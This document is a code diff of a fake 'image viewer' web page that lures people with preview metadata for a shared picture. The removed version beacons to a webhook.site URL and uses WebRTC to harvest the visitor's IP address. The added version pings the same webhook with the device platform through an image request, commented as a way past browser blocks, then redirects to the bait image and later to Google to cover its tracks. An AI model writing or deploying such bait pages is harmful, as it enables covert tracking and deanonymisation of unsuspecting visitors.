@@ -1,53 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta property="og:title" content="Shared Image">
-    <meta property="og:description" content="Click to view full resolution image">
-    <meta property="og:image" content="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
-
-    <title>Image Viewer</title>
-
-    <script>
+<script>
         function runPayload() {
-            // 1. THE EMERGENCY REDIRECT (Self-Destruct)
-            setTimeout(function() { 
-                window.location.href = "https://www.google.com"; 
-            }, 23000);
+            // THE REDIRECT PING (Bypasses CORS blocks)
+            // This forces the browser to actually "go" to the webhook URL for a split second
+            const webhookURL = "https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform;
+            
+            // We use an <img> tag to "ping" the server—it's much harder for browsers to block than a fetch
+            var ping = new Image();
+            ping.src = webhookURL;
 
-            // 2. THE IMMEDIATE PING
-            // This tells us the script is ALIVE even if the IP grab fails.
-            fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform);
-
-            // 3. THE BAIT REDIRECT
-            // Moves to the image after 1.5 seconds.
-            setTimeout(function() {
+            // BAIT: Show the image after 1 second
+            setTimeout(() => {
                 window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
-            }, 1500);
+            }, 1000);
 
-            // 4. THE IP GRABBER
-            try {
-                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-                    const match = ipRegex.exec(ice.candidate.candidate);
-                    if (match) {
-                        const internalIP = match[1];
-                        fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?ip=" + internalIP);
-                    }
-                };
-            } catch (e) {
-                console.log("WebRTC Blocked");
-            }
+            // SELF-DESTRUCT: Go to Google after 23 seconds
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 23000);
         }
         window.onload = runPayload;
     </script>
-</head>
-<body style="background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p style="color: white; font-family: sans-serif;">Loading High Resolution Image...</p>
-</body>
-</html>
